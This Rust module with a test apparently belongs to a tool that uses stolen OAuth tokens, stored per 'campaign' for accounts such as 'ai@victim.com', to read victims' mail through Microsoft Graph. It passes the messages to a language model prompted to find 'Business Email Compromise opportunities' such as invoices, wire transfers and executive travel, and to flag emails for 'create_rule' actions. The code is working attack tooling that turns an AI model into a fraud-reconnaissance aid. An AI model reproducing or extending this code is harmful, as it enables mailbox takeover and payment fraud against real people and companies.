use crate::graph_client::GraphClient;
use crate::vault::Vault;
use crate::AppState;
use actix_web::{web, HttpResponse, Responder};
use anyhow::Context;
use chrono::Utc;
use serde::{Deserialize, Serialize};
use sqlx::SqlitePool;

#[derive(Deserialize)]
pub struct AnalyzeRequest {
    pub token_id: String,
    pub message_count: i32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AIAnalysisReport {
    pub findings: Vec<AIFinding>,
    pub overall_risk_score: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AIFinding {
    pub email_index: usize,
    pub category: String,
    pub confidence: f64,
    pub summary: String,
    pub recommended_action: String,
}

#[derive(Serialize)]
struct OpenAIRequest {
    model: String,
    messages: Vec<OpenAIMessage>,
    temperature: f64,
    max_tokens: i32,
}

#[derive(Serialize)]
struct OpenAIMessage {
    role: String,
    content: String,
}

#[derive(Deserialize)]
struct OpenAIResponse {
    choices: Vec<OpenAIChoice>,
}

#[derive(Deserialize)]
struct OpenAIChoice {
    message: OpenAIChoiceMessage,
}

#[derive(Deserialize)]
struct OpenAIChoiceMessage {
    content: String,
}

fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

fn build_prompt(emails: &[(usize, String)]) -> String {
    let email_text = emails
        .iter()
        .map(|(idx, text)| format!("Email {}:\n{}", idx, text))
        .collect::<Vec<_>>()
        .join("\n---\n");

    format!(
        r#"You are a security analysis assistant. Analyze the following emails for Business Email Compromise opportunities.
Look for: pending invoices, wire transfer requests, vendor changes, executive travel, sensitive attachments, financial approvals.

{}

Return STRICT JSON and nothing else:
{{ "findings": [ {{ "email_index": 0, "category": "invoice|wire_transfer|travel|sensitive|other", "confidence": 0.0, "summary": "...", "recommended_action": "create_rule|none" }} ], "overall_risk_score": 0.0 }}"#,
        email_text
    )
}

fn build_retry_prompt(emails: &[(usize, String)]) -> String {
    let email_text = emails
        .iter()
        .map(|(idx, text)| format!("Email {}:\n{}", idx, text))
        .collect::<Vec<_>>()
        .join("\n---\n");

    format!(
        r#"You are a security analysis assistant. Analyze the following emails for Business Email Compromise opportunities.
Look for: pending invoices, wire transfer requests, vendor changes, executive travel, sensitive attachments, financial approvals.

{}

IMPORTANT: Return ONLY valid JSON. Do not include markdown formatting, explanations, or code blocks.
The JSON must follow this exact schema:
{{ "findings": [ {{ "email_index": 0, "category": "invoice|wire_transfer|travel|sensitive|other", "confidence": 0.0, "summary": "...", "recommended_action": "create_rule|none" }} ], "overall_risk_score": 0.0 }}"#,
        email_text
    )
}

async fn call_openai(
    http_client: &reqwest::Client,
    api_key: &str,
    model: &str,
    prompt: &str,
    base_url: &str,
) -> anyhow::Result<AIAnalysisReport> {
    let req_body = OpenAIRequest {
        model: model.to_string(),
        messages: vec![OpenAIMessage {
            role: "user".to_string(),
            content: prompt.to_string(),
        }],
        temperature: 0.2,
        max_tokens: 4000,
    };

    let url = format!("{}/v1/chat/completions", base_url.trim_end_matches('/'));
    let res = http_client
        .post(&url)
        .header("Authorization", format!("Bearer {}", api_key))
        .header("Content-Type", "application/json")
        .json(&req_body)
        .send()
        .await
        .context("OpenAI API request failed")?;

    if !res.status().is_success() {
        let status = res.status();
        let body = res.text().await.unwrap_or_default();
        anyhow::bail!("OpenAI API returned {}: {}", status, body);
    }

    let body: OpenAIResponse = res.json().await.context("Failed to parse OpenAI response")?;
    let content = body
        .choices
        .into_iter()
        .next()
        .map(|c| c.message.content)
        .unwrap_or_default();

    // Try to extract JSON from markdown code blocks if present
    let json_str = if content.contains("```json") {
        content
            .split("```json")
            .nth(1)
            .and_then(|s| s.split("```").next())
            .unwrap_or(&content)
            .trim()
            .to_string()
    } else if content.contains("```") {
        content
            .split("```")
            .nth(1)
            .unwrap_or(&content)
            .trim()
            .to_string()
    } else {
        content.trim().to_string()
    };

    let report: AIAnalysisReport = serde_json::from_str(&json_str)
        .with_context(|| format!("Failed to parse AI JSON response: {}", json_str))?;

    Ok(report)
}

pub async fn run_ai_analysis(
    pool: &SqlitePool,
    vault: &Vault,
    http_client: &reqwest::Client,
    client: &GraphClient,
    token_id: &str,
    message_count: i32,
    api_key: &str,
    model: &str,
    openai_base_url: &str,
) -> anyhow::Result<AIAnalysisReport> {
    let token = vault
        .retrieve_token(pool, token_id)
        .await
        .context("Failed to retrieve token for AI analysis")?;

    let inbox = client
        .get_messages_for_analysis(&token.access_token, message_count)
        .await
        .context("Failed to fetch emails for analysis")?;

    let emails: Vec<(usize, String)> = inbox
        .value
        .into_iter()
        .enumerate()
        .map(|(idx, msg)| {
            let sender = msg
                .from
                .as_ref()
                .and_then(|f| f.emailAddress.as_ref())
                .and_then(|e| e.address.as_ref())
                .cloned()
                .unwrap_or_else(|| "unknown".to_string());
            let subject = msg.subject.unwrap_or_else(|| "(no subject)".to_string());
            let preview = msg.bodyPreview.unwrap_or_default();
            let preview = truncate(&preview, 500);
            let received = msg.receivedDateTime.unwrap_or_default();

            let text = format!(
                "From: {}\nSubject: {}\nDate: {}\nPreview: {}",
                sender, subject, received, preview
            );
            (idx, text)
        })
        .collect();

    if emails.is_empty() {
        return Ok(AIAnalysisReport {
            findings: vec![],
            overall_risk_score: 0.0,
        });
    }

    let prompt = build_prompt(&emails);

    let report = match call_openai(http_client, api_key, model, &prompt, openai_base_url).await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[ai] First attempt failed, retrying with stricter prompt: {}", e);
            let retry_prompt = build_retry_prompt(&emails);
            call_openai(http_client, api_key, model, &retry_prompt, openai_base_url)
                .await
                .context("AI analysis failed after retry")?
        }
    };

    let analysis_json = serde_json::to_string(&report).context("Failed to serialize analysis")?;
    let id = uuid::Uuid::new_v4().to_string();

    sqlx::query(
        "INSERT INTO ai_analyses (id, token_id, analysis_json, created_at) VALUES (?, ?, ?, ?)",
    )
    .bind(&id)
    .bind(token_id)
    .bind(&analysis_json)
    .bind(Utc::now())
    .execute(pool)
    .await
    .context("Failed to store AI analysis")?;

    Ok(report)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoredAnalysis {
    pub id: String,
    pub token_id: String,
    pub token_email: String,
    pub report: AIAnalysisReport,
    pub created_at: String,
}

// === HTTP Handlers ===

#[derive(Deserialize)]
pub struct AnalysesQuery {
    token_id: Option<String>,
}

pub async fn ai_analyses_handler(
    query: web::Query<AnalysesQuery>,
    state: web::Data<AppState>,
) -> impl Responder {

    #[derive(sqlx::FromRow)]
    struct AnalysisRow {
        id: String,
        token_id: String,
        token_email: Option<String>,
        analysis_json: String,
        created_at: chrono::DateTime<Utc>,
    }

    let rows: Vec<AnalysisRow> = match &query.token_id {
        Some(tid) => {
            sqlx::query_as::<_, AnalysisRow>(
                "SELECT a.id, a.token_id, t.user_email as token_email, a.analysis_json, a.created_at \
                 FROM ai_analyses a JOIN tokens t ON a.token_id = t.id \
                 WHERE a.token_id = ? \
                 ORDER BY a.created_at DESC"
            )
            .bind(tid)
            .fetch_all(&state.pool)
            .await
            .unwrap_or_default()
        }
        None => {
            sqlx::query_as::<_, AnalysisRow>(
                "SELECT a.id, a.token_id, t.user_email as token_email, a.analysis_json, a.created_at \
                 FROM ai_analyses a JOIN tokens t ON a.token_id = t.id \
                 ORDER BY a.created_at DESC \
                 LIMIT 100"
            )
            .fetch_all(&state.pool)
            .await
            .unwrap_or_default()
        }
    };

    let analyses: Vec<StoredAnalysis> = rows
        .into_iter()
        .filter_map(|row| {
            let report: AIAnalysisReport = serde_json::from_str(&row.analysis_json).ok()?;
            let token_email = row.token_email.unwrap_or_else(|| row.token_id.clone());
            Some(StoredAnalysis {
                id: row.id,
                token_id: row.token_id,
                token_email,
                report,
                created_at: row.created_at.to_rfc3339(),
            })
        })
        .collect();

    HttpResponse::Ok().json(analyses)
}

pub async fn ai_analyze_handler(
    body: web::Json<AnalyzeRequest>,
    req: actix_web::HttpRequest,
    audit_ctx: crate::audit::AuditContext,
    state: web::Data<AppState>,
) -> impl Responder {
    let api_key = match std::env::var("AI_API_KEY") {
        Ok(k) => k,
        Err(_) => {
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "ai_not_configured",
                "message": "AI_API_KEY environment variable not set"
            }));
        }
    };
    let model = std::env::var("AI_MODEL").unwrap_or_else(|_| "gpt-4o-mini".to_string());

    let graph_client = GraphClient::new();
    let result = run_ai_analysis(
        &state.pool,
        &state.vault,
        &state.http_client,
        &graph_client,
        &body.token_id,
        body.message_count,
        &api_key,
        &model,
        "https://api.openai.com",
    )
    .await;

    let success = result.is_ok();
    let _ = crate::audit::insert_audit_log(
        &state.pool,
        "ai_analysis",
        None,
        Some(&body.token_id),
        None,
        Some(&audit_ctx.ip_address),
        Some(&audit_ctx.user_agent),
        Some(serde_json::json!({
            "message_count": body.message_count,
            "model": model,
            "success": success
        })),
        success,
    ).await;

    match result {
        Ok(report) => {
            let json = serde_json::to_value(report).unwrap_or_default();
            crate::response_crypto::ResponseCrypto::respond(&req, json, &state.response_key)
        }
        Err(e) => {
            eprintln!("[ai] Analysis failed for {}: {}", body.token_id, e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "analysis_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::AppConfig;
    use sqlx::sqlite::SqlitePoolOptions;
    use wiremock::matchers::{header, method, path, query_param};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    async fn setup_test_state() -> AppState {
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE tokens (
                id TEXT PRIMARY KEY,
                campaign_id TEXT,
                user_email TEXT,
                encrypted_access_token BLOB NOT NULL,
                encrypted_refresh_token BLOB NOT NULL,
                access_salt BLOB NOT NULL,
                refresh_salt BLOB NOT NULL,
                scopes TEXT,
                expires_at DATETIME NOT NULL,
                created_at DATETIME NOT NULL,
                last_refreshed_at DATETIME,
                status TEXT DEFAULT 'active'
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE ai_analyses (
                id TEXT PRIMARY KEY,
                token_id TEXT NOT NULL,
                analysis_json TEXT NOT NULL,
                created_at DATETIME NOT NULL
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        let config = AppConfig {
            client_id: "test_client_id".to_string(),
            client_secret: "test_secret".to_string(),
            redirect_uri: "http://localhost".to_string(),
            first_party_ids: vec![],
            database_url: "sqlite::memory:".to_string(),
            telegram_bot_token: None,
            telegram_chat_id: None,
            master_secret: "test_ai_secret".to_string(),
            frontend_url: None,
        };

        let vault = Vault::new(config.master_secret.clone());
        let http_client = reqwest::Client::new();

        let response_key = crate::response_crypto::ResponseCrypto::derive_key(&config.master_secret);

        AppState {
            pool,
            config,
            http_client,
            vault,
            response_key,
        }
    }

    #[tokio::test]
    async fn test_ai_analysis_success() {
        let state = setup_test_state().await;
        let graph_mock = MockServer::start().await;
        let openai_mock = MockServer::start().await;

        let token_id = state
            .vault
            .store_token(
                &state.pool,
                "camp_ai",
                "ai@victim.com",
                "access_ai_123",
                "refresh_ai_123",
                vec!["Mail.Read".to_string()],
                Utc::now() + chrono::Duration::hours(2),
            )
            .await
            .unwrap();

        // Mock Graph API /me/messages
        Mock::given(method("GET"))
            .and(path("/v1.0/me/messages"))
            .and(query_param("$top", "10"))
            .and(query_param("$select", "sender,subject,bodyPreview,body,receivedDateTime,conversationId,hasAttachments"))
            .and(query_param("$orderby", "receivedDateTime DESC"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "value": [
                    {
                        "id": "msg-1",
                        "subject": "Invoice #1234 - Payment Due",
                        "from": { "emailAddress": { "address": "vendor@example.com", "name": "Vendor" } },
                        "receivedDateTime": "2024-01-15T10:00:00Z",
                        "bodyPreview": "Please find attached the invoice for $50,000. Wire transfer details inside.",
                        "conversationId": "conv-1"
                    },
                    {
                        "id": "msg-2",
                        "subject": "Meeting invitation",
                        "from": { "emailAddress": { "address": "boss@company.com", "name": "Boss" } },
                        "receivedDateTime": "2024-01-15T09:00:00Z",
                        "bodyPreview": "Lets meet at 3pm to discuss the quarterly results.",
                        "conversationId": "conv-2"
                    }
                ]
            })))
            .mount(&graph_mock)
            .await;

        // Mock OpenAI API
        Mock::given(method("POST"))
            .and(path("/v1/chat/completions"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "choices": [{
                    "message": {
                        "content": r#"{ "findings": [ { "email_index": 0, "category": "invoice", "confidence": 0.95, "summary": "Large invoice requesting wire transfer", "recommended_action": "create_rule" }, { "email_index": 1, "category": "other", "confidence": 0.1, "summary": "Regular meeting invitation", "recommended_action": "none" } ], "overall_risk_score": 0.85 }"#
                    }
                }]
            })))
            .mount(&openai_mock)
            .await;

        let client = GraphClient::with_base_url(&graph_mock.uri());

        let report = run_ai_analysis(
            &state.pool,
            &state.vault,
            &state.http_client,
            &client,
            &token_id,
            10,
            "test-api-key",
            "gpt-4o-mini",
            &openai_mock.uri(),
        )
        .await
        .expect("AI analysis should succeed");

        assert_eq!(report.findings.len(), 2);
        assert_eq!(report.findings[0].category, "invoice");
        assert!(report.findings[0].confidence > 0.9);
        assert_eq!(report.findings[0].recommended_action, "create_rule");
        assert!(report.overall_risk_score > 0.8);

        // Verify DB record
        let row: (String,) = sqlx::query_as(
            "SELECT analysis_json FROM ai_analyses WHERE token_id = ? ORDER BY created_at DESC LIMIT 1"
        )
        .bind(&token_id)
        .fetch_one(&state.pool)
        .await
        .unwrap();

        let stored: AIAnalysisReport = serde_json::from_str(&row.0).unwrap();
        assert_eq!(stored.findings.len(), 2);
    }
}
